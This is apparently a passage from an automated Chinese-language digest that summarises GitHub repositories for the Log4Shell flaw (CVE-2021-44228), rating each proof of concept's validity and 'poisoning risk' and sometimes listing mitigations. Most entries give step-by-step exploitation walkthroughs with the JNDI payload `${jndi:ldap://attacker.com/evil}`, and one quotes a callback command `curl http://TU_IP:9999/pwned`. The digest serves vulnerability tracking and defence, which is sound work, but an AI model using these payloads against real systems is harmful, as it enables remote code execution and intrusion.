攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
